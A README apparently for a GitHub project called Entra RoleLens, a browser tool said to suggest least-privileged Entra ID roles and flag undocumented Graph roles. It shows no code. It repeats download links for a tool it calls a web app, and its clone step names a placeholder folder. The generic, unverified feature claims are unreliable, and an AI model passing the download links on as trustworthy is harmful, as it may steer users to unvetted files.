# Entra RoleLens v1.0 - least-privilege role analysis tool 2026

> **Entra RoleLens is a browser-based Entra ID analysis utility for finding the least-privileged built-in role for a task, comparing permissions across roles, and examining role coverage in version 1.0.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/dylan-hallwpa7748/entra-rolelens-analysis?style=flat-square)](https://github.com/dylan-hallwpa7748/entra-rolelens-analysis)

---

<p align="center">
  <a href="https://dylan-hallwpa7748.github.io/entra-rolelens-analysis/">
    <img src="https://img.shields.io/badge/Download-Entra%20RoleLens%20Latest-brightgreen?style=for-the-badge" alt="Download Entra RoleLens">
  </a>
</p>

> **[Download Entra RoleLens v1.0](https://dylan-hallwpa7748.github.io/entra-rolelens-analysis/)**

---

[Download Latest Build](https://dylan-hallwpa7748.github.io/entra-rolelens-analysis/)

---

## What Entra RoleLens Does

Choosing an Entra ID role can involve more permission review than the task itself. Entra RoleLens links administrative tasks with built-in roles, exposes differences in capabilities, and helps identify a more focused assignment where one is available.

The web app is intended for administrators examining Microsoft Graph permissions, checking whether tasks have adequate role coverage, and investigating roles that seem absent from the documented catalog. Its historical tracking also provides a way to follow role changes and compare coverage across successive refreshes.

---

## Key Capabilities

- Determines the smallest matching built-in Entra ID role for a selected task
- Places two roles side by side and identifies their permission differences
- Updates the role catalog and task mappings every night
- Marks undocumented Microsoft Graph roles as shadow roles
- Provides a historical timeline of role changes
- Reports coverage for both mapped tasks and roles
- Includes analysis support for Conditional Access and audit log workflows
- Runs as a web application for browser-based investigation

---

## Getting Started

Use the project page to download the current build, then launch it in a supported modern browser.

To work with the repository version, clone the project and serve its web content through a local preview tool or another static hosting solution:

    git clone https://github.com/dylan-hallwpa7748/entra-rolelens-analysis.git
    cd REPO

Afterward, open the web application's entry point directly, or access it through the local web server you selected.

---

## Using the Application

Select or enter the task you need to assess. When the catalog contains a match, Entra RoleLens presents the least-privileged built-in role it can identify.

For a more direct permission review, choose two roles for comparison. Their differences can help determine whether a narrower assignment is suitable instead of a broader one.

A practical review sequence is:

1. Find the relevant task and its role match.
2. Examine the proposed role and its coverage information.
3. Compare possible alternatives when a lower-privilege choice may be appropriate.
4. Review the change timeline for recent catalog movement.
5. Investigate shadow role indicators before relying on a Graph-related role in your analysis.

---

## Configuration and Data Sources

The web interface and the project's bundled data files provide most of the available configuration.

When running the repository locally, check the catalog and mapping inputs responsible for:

- role searching
- task-to-role associations
- the nightly refresh process
- timeline presentation
- shadow role identification

For builds that include a configuration file, make sure its refresh timing and source locations suit the environment where the application is hosted.

---

## Requirements

- A modern web browser capable of running current HTML interfaces
- Either the published web build or a local static web server
- Entra ID and Microsoft Graph data sources for useful analysis results
- Enough storage for the role catalog and mapping refreshes
- Network connectivity when using updated catalog data or external Graph-related references

---

## Frequently Asked Questions

**How does the application select a suggested role?**  
It consults the current catalog to associate the task with the smallest built-in Entra ID role it can find.

**What does the shadow role label indicate?**  
The label is used for roles that appear undocumented or that do not align with the expected Microsoft Graph role catalog.

**When are catalog changes pulled in?**  
The role catalog and task mappings are refreshed once per night.

**What if there is no clear task-to-role match?**  
Use coverage indicators together with the role comparison view to identify the closest candidate. The change timeline can also show whether recent updates affected the result.

**How can I suggest a change or report a problem?**  
Submit it through the repository issue tracker or the project discussion channel when the maintainer has made one available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
